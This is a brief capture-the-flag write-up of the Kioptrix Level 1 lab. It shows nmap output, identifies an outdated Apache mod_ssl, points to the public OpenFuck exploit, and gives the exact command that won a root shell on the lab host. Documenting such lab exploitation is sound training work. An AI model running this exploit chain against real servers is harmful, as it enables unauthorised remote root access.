<h1>Kioptrix: Level 1 Write-up</h1>

<h2>NMAP</h2>

```
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        syn-ack ttl 64 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     syn-ack ttl 64 2 (RPC #100000)
139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   syn-ack ttl 64 Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
1024/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
```
Nmap Show's mod_ssl/2.8.4

After little googing i found openfuck exploit:

Exploit : https://github.com/heltonWernik/OpenLuck

To use this exploit, must know exact os and apache version 

From 404 page i found apache version 

Apache Version : apache-1.3.20-16

and on executing the OpenFuck Binary and greping that apache version there are only 2 left 

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Kioptrix%3A%20Level%201/Images/openfuck-exp-ver.png)

<h3>Exploiting</h3>

**0x6b** is the exact one :

```./OpenFuck 0x6b 192.168.43.55 443 -c 40```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Kioptrix%3A%20Level%201/Images/exploiting.png)

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Kioptrix%3A%20Level%201/Images/root.png)
